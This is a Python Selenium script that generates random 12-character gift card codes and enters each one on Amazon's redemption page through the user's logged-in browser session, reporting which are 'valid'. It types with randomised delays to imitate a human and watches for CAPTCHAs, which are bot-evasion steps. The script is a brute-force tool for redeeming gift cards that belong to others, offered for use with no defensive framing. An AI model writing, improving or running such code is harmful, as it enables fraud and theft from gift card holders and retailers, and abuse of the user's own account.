import random
import string
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time
import getpass  

def generate_code(group_length=4, num_groups=3):
    """Generate a random gift card code in the format XXXX-XXXX-XXXX."""
    groups = [
        ''.join(random.choices(string.ascii_uppercase + string.digits, k=group_length))
        for _ in range(num_groups)
    ]
    return '-'.join(groups)

def generate_codes(count, group_length=4, num_groups=3):
    """Generate a list of unique gift card codes."""
    codes = set()
    while len(codes) < count:
        codes.add(generate_code(group_length, num_groups))
    return list(codes)

def is_captcha_present(driver):
    """Check if CAPTCHA is present on the page."""
    try:
        WebDriverWait(driver, 3).until(
            EC.presence_of_element_located((By.CSS_SELECTOR, "div[id='captchao-pn']"))
        )
        return True
    except Exception:
        return False

def type_in_code(input_field, code):
    """Simulate typing each character of the gift card code."""
    for char in code:
        input_field.send_keys(char)
        time.sleep(random.uniform(0.1, 0.3)) 

def verify_code_online(driver, code):
    """Check if the gift card code can be redeemed on Amazon."""
    url = "https://www.amazon.com/gc/redeem/" 
    try:
        driver.get(url)


        WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "gc-redemption-input"))
        )


        if is_captcha_present(driver):
            print("CAPTCHA detected. Stopping the script.")
            return False

        input_field = driver.find_element(By.ID, "gc-redemption-input")
        type_in_code(input_field, code)
        input_field.send_keys(Keys.RETURN)

        WebDriverWait(driver, 5).until(
            EC.presence_of_element_located((By.CLASS_NAME, "gc-redemption-message"))
        )

        if "Invalid" in driver.page_source:
            return False
        return True
    except Exception as e:
        print(f"Error during verification: {e}")
        return False

def main():
    print("Gift Card Code Generator and Verifier")


    print("Ensure you're already logged into Amazon in your browser!")

    driver = webdriver.Chrome()  
    try:

        driver.get("https://www.amazon.com")  
        
        num_codes = int(input("Enter the number of codes to generate: "))
        codes = generate_codes(num_codes)

        print("\nGenerated Codes:")
        for code in codes:
            print(code)

        print("\nVerifying Codes Online:")
        for code in codes:
            if verify_code_online(driver, code):
                print(f"{code}: Valid")
            else:
                print(f"{code}: Invalid or unable to verify")
    finally:
        driver.quit()

if __name__ == "__main__":
    main()
